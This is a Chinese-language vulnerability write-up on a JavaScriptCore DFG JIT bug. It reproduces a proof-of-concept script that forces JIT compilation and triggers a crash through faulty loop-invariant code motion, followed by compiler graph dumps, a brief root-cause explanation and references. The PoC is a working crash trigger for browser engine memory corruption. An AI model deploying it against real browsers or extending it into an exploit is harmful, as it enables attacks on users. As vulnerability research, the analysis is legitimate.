# JavaScriptCore部分poc分析

## Bug

```javascript
function v2(trigger) {
    //强制程序进入JIT
    for (let v7 = 0; v7 < 1000000; v7++) { }
    if (!trigger) {
        /* 
            JavaScript函数初始化会创建arguements对象，其包含
            callee: 指向参数所属的执行函数
            length: 形参数量
            @@interator: 迭代器，用来返回各个形参

        */
        arguments.length = 1;
    }

    for (let v11 = 0; v11 < 10; v11++) {
        // 在for of语句中JIT优化时会将ArrayIterator.next优化为内联函数
        for (const v14 of arguments) {
            const v18 = {a:1337};
            // with 语句会防止程序将v18移到堆栈段，从而迫使将v18写入内存中
            with (v18) { }
        }
    }
}
for (let v23 = 0; v23 < 100; v23++) {
    v2(false);
}
document.write("Triggering crash");
v2(true);
```

## Analysis

### 报错信息

```wiki
Block #8 (Before outer loop)
	...
Block #10 (bc#180): (Outer loop)
104:<!0:-> CheckStructure(Check:Cell:@97, MustGen, [%Cp:Arguments], R:JSCell_structureID, Exits, bc#201, ExitValid)
105:< 2:-> GetButterfly(Cell:@97, Storage|UseAsOther, Other, R:JSObject_butterfly, Exits, bc#201, ExitValid)
Block #12 (bc#464 --> next#<no-hash>:<0x10a8a08c0> bc#43 --> arrayIteratorValueNext#<no-hash>:<0x10a8a0a00> bc#29): (Inner loop header)
378:< 4:-> GetByOffset(Check:Untyped:@105, KnownCell:@97, JS|PureInt|UseAsInt, BoolInt32, id2{length}, 100, R:NamedProperties(2), Exits, bc#34, ExitValid) predicting BoolInt32
Block #17 (bc#487): (Inner loop body)
267:< 8:-> NewObject(JS|UseAsOther, Final, %B8:Object, R:HeapObjectCount, W:HeapObjectCount, Exits, bc#274, ExitValid)
273:<!0:-> PutByOffset(KnownCell:@267, KnownCell:@267, Check:Untyped:@270, MustGen, id7{a}, 0, W:NamedProperties(7), ClobbersExit, bc#278, ExitValid)
274:<!0:-> PutStructure(KnownCell:@267, MustGen, %B8:Object -> %EQ:Object, ID:45419, R:JSObject_butterfly, W:JSCell_indexingType,JSCell_structureID,JSCell_typeInfoFlags,JSCell_typeInfoType, ClobbersExit, bc#
278, ExitInvalid)
	...
JIT优化,数据流图将变为:
Block #8 (Before outer loop)
	...
105:< 2:-> GetButterfly(Cell:@97, Storage|UseAsOther, Other, R:JSObject_butterfly, Exits, bc#201, ExitValid)
378:< 4:-> GetByOffset(Check:Untyped:@105, KnownCell:@97, JS|PureInt|UseAsInt, BoolInt32, id2{length}, 100, R:NamedProperties(2), Exits, bc#34, ExitValid) predicting BoolInt32
Block #10 (bc#180): (Outer loop)
104:<!0:-> CheckStructure(Check:Cell:@97, MustGen, [%Cp:Arguments], R:JSCell_structureID, Exits, bc#201, ExitValid)
Block #12 (bc#464 --> next#<no-hash>:<0x10a8a08c0> bc#43 --> arrayIteratorValueNext#<no-hash>:<0x10a8a0a00> bc#29): (Inner loop header)
Block #17 (bc#487): (Inner loop body)
267:< 8:-> NewObject(JS|UseAsOther, Final, %B8:Object, R:HeapObjectCount, W:HeapObjectCount, Exits, bc#274, ExitValid)
273:<!0:-> PutByOffset(KnownCell:@267, KnownCell:@267, Check:Untyped:@270, MustGen, id7{a}, 0, W:NamedProperties(7), ClobbersExit, bc#278, ExitValid)
274:<!0:-> PutStructure(KnownCell:@267, MustGen, %B8:Object -> %EQ:Object, ID:45419, R:JSObject_butterfly, W:JSCell_indexingType,JSCell_structureID,JSCell_typeInfoFlags,JSCell_typeInfoType, ClobbersExit, bc#278, ExitInvalid)
```

### 分析

用来加载.length的GetButterfly(JS数组的地址，左边地址存储数组的属性，右边地址存储数组的值)、GetByOffset(通过获取偏移量取值)被放在了CheckStructure之前(本该先检查结构体是否存在再进行。)

## Problem

得了解JSC的DFG JIt源码才能更好的了解成因 这其实是个典型的 loop-invariant code motion (LICM)判断错误

## Reference

> [Bug](https://cxsecurity.com/issue/WLB-2019080022)
> [DFG JIT](https://dwfault.github.io/)
> [The Butterfly of JsObject](https://liveoverflow.com/the-butterfly-of-jsobject-browser-0x02/)
> [类似Bug1](https://bugs.chromium.org/p/project-zero/issues/detail?id=1789)
> [类似Bug2](https://bugs.chromium.org/p/project-zero/issues/detail?id=1775)